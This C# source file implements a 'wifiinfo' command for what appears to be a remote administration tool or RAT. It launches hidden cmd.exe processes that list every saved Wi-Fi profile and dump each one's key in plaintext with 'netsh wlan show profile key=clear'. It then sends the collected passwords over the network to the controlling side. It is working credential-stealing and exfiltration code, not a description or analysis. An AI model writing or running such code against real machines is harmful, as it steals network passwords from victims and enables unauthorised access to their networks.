using System;
using Shared;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;

namespace ServerCommands
{
    internal class WifiInfo : ICommand
    {
        public string name { get; } = "wifiinfo";


        public void Process(List<string> args)
        {
            // Get wifi profiles names
            var cmd = "/C netsh wlan show profiles";
            var proc = new Process
            {
                StartInfo =
                {
                    FileName = "cmd.exe",
                    Arguments = cmd,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    StandardOutputEncoding = Encoding.GetEncoding(850)
                }
            };
            proc.Start();

            var profiles = proc.StandardOutput.ReadToEnd()
                .Split('\n')
                .Where(x => x.Contains(':') && x.Length > 5)
                .Skip(1)
                .Select(x => x.Substring(x.LastIndexOf(':') + 2, x.Length - x.LastIndexOf(':') - 3))
                .ToList();
            proc.WaitForExit();

            // For each profile, get its informations, including the clear stored key
            var data = "";
            foreach (var profile in profiles)
            {
                proc.StartInfo.Arguments = $"/C netsh wlan show profile \"{profile}\" key=clear";
                proc.Start();
                data += proc.StandardOutput.ReadToEnd();
            }
            data += "{end}";

            ServerCommandsManager.networkManager.WriteLine(data);
        }
    }
}
